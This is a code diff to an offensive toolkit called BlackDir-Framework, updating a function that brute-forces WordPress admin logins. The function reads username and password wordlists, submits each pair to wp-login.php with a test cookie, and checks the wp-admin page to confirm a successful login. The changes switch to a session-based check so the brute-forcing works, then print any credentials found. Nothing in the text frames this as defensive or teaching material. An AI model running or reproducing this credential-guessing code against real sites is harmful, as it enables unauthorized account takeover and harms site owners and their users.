@@ -2,8 +2,7 @@
     BlackDir-Framework Project
     author:RedVirus Twitter:Je_1r insta:redvirus_0 
     author:Ali Twitter:bc_zQ
-    
-    
+
     Thx for all use this project
 
 
@@ -655,6 +654,7 @@ def hash_identifier(hashing):
 def wordpress(url,username,password):
     send = {}
     print(colored("[!] Start Brute Force","red"))
+    time.sleep(2)
     if username ==None and password == None:
         u_file = open("username.txt", "r")
         p_file = open("password.txt", "r")
@@ -675,10 +675,10 @@ def wordpress(url,username,password):
         p_file = open(password, "r")
         print(colored("File For Users:","green"),username)
         print(colored("File For Users:","green"),password)
-
-    url_edit = url+"/"+"wp-admin"
-    headers = {"Cookie": "wordpress_test_cookie=WP+Cookie+check"}
-    url_req = requests.post(url_edit,headers=headers)
+    time.sleep(2)
+    url_edit = url+"/"+"wp-login.php"
+    wp_admin = url+"/"+"wp-admin"
+    url_req = requests.post(url_edit)
     if url_req.status_code == 200:
         for usernames in u_file:
             usernames = usernames.strip()
@@ -696,11 +696,17 @@ def wordpress(url,username,password):
                         input_submit_name = url_input.get("name")
                         input_submit_value = url_input.get("value")
                         send[input_submit_name] = input_submit_value
-                req_check = requests.post(url_edit,send,headers=headers)
-                if url+"wp-login.php?action=lostpassword"  not in req_check.text:
+                with requests.Session() as sessions:
+                    headers1 = {'Cookie': 'wordpress_test_cookie=WP Cookie check'}
+                    sessions.post(url_edit,headers=headers1,data=send)
+                    response = sessions.get(wp_admin)
+                if url+"/wp-login.php?action=lostpassword" not in response.text:
+
                     print("Found !","Username:",usernames,"password:",passowrds)
+                    exit(0)
                 else:
                     print(colored("Not Found !","red"),"Username:",usernames,"password:",passowrds)
+
     else:
         print(colored("URL is Wrong !","red"))
         exit(1)
